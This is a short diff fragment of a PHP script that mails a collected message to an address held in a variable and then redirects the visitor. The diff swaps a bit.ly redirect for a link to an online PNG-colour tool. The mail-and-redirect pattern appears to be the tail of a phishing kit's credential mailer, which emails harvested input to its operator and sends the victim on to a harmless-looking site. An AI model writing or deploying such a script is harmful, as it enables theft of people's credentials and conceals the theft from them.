@@ -30,4 +30,4 @@ fclose($handle);
 fwrite($subject, $message);
 mail($send,$subject,$message,$headers);
 
-header('Location: https://bit.ly/3q8Tgk4');?>
+header('Location: https://onlinepngtools.com/change-png-color');?>
